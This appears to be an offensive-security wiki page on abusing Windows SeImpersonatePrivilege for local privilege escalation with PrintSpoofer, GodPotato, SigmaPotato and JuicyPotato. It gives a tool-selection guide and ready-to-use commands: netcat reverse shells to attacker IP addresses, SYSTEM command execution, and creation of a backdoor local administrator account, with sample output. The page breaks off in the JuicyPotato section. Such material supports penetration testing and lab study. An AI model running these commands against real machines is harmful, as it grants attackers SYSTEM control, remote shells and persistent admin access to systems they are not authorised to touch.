# SeImpersonatePrivilege

The `SeImpersonatePrivilege` allows a user to operate under another user's security context, typically by impersonating clients via mechanisms like **named pipes** or **RPC**. This privilege is normally assigned to Administrator accounts and built-in service accounts like `LOCAL SERVICE`, `NETWORK SERVICE`, and `SERVICE`. While rare for standard users, `SeImpersonatePrivilege` is often accessible when gaining code execution through services like **IIS**, which commonly run under accounts that have it.

{% hint style="info" %}
**Named pipes** are a method of **inter-process communication (IPC)** in Windows. They let two separate processes—either on the same system or across a network—**send and receive data** as if they were reading/writing to a file. Think of a named pipe as a **virtual file** that one process (the server) creates and waits on, while another (the client) connects to it using a known name (like `\\.\pipe\mypipe`). Once connected, both processes can exchange data in real time.
{% endhint %}

In the context of **privilege escalation**, named pipes can be abused when a **privileged process connects** to a pipe controlled by a lower-privileged attacker. If the attacker has `SeImpersonatePrivilege`, they can **impersonate the connecting user**, effectively hijacking their permissions.

## PoCs

How to choose the appropriate PoC:

1. Start with PrintSpoofer if the Print Spooler service is running and the system is older (Windows 10 / Server 2016–2019).
2. If PrintSpoofer is patched, try GodPotato (needs a specific COM object).
3. If you want flexibility or older systems, JuicyPotato is usually safest; pick a CLSID and test with `-z`.
4. SigmaPotato is a fallback for very new builds or special configurations where the others fail.

{% tab title="PrintSpofer" %}
[PrintSpoofer](https://github.com/itm4n/PrintSpoofer) is a local privilege escalation exploit that abuses the `SeImpersonatePrivilege` to impersonate the `SYSTEM` account via a named pipe trick. It can be leveraged to sent a reverse shell or execute commands directly:

```powershell
# Reverse shell
PrintSpoofer.exe -c "nc.exe 10.10.13.37 1337 -e cmd"

# Command execution
PrintSpoofer.exe -i -c cmd
```

It can also be used to spawn a `SYSTEM` shell on the desktop, for instance, when logged in via an RDP session:

```powershell
# Check your session ID
C:\TOOLS>qwinsta
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>rdp-tcp           lab-user                  3  Active
 
# Spawn a new shell
C:\TOOLS>PrintSpoofer.exe -d 3 -c "powershell -ep bypass"
```
{% endtab %}

{% tab title="GodPotato" %}
[GodPotato](https://github.com/BeichenDream/GodPotato) is a local privilege escalation exploit that abuses `COM` and `SeImpersonatePrivilege` to impersonate `SYSTEM` by hijacking privileged tokens via named pipes.

```powershell
# Reverse shell
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"

# Command execution
GodPotato -cmd "cmd /c whoami"
```
{% endtab %}

{% tab title="SigmaPotato" %}
[SigmaPotato](https://github.com/tylerdotrar/SigmaPotato) is a local privilege escalation exploit that leverages the `SeImpersonatePrivilege` and the Event Log service to hijack a `SYSTEM` token through named pipe impersonation.

```powershell
# Reverse shell
./SigmaPotato.exe --revshell <ip_addr> <port>

# Command execution
./SigmaPotato.exe <command>
```

It can be also used to create a new local administrator:

```powershell
> .\sigmapotato.exe "net user dave4 Pass123! /add"
[+] Process Output:
The command completed successfully.


> .\sigmapotato.exe "net localgroup Administrators dave4 /add"
[+] Process Output:
The command completed successfully.

> Get-LocalGroupMember administrators
User        CLIENTWK220\dave4         Local
```

{% tab title="JuicyPotato" %}
[JuicyPotato](https://github.com/ohpe/juicy-potato) is a Windows privilege escalation tool that elevates service account privileges to `NT AUTHORITY\SYSTEM` by exploiting COM objects with `SeImpersonatePrivilege`. It instantiates vulnerable COM classes, triggers local NTLM authentication, and executes arbitrary commands with `SYSTEM`-level access. The tool allows specifying CLSID, port, and target executable, making it effective when traditional escalation methods are blocked or systems are hardened. Various CLSID lists can be found [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID).
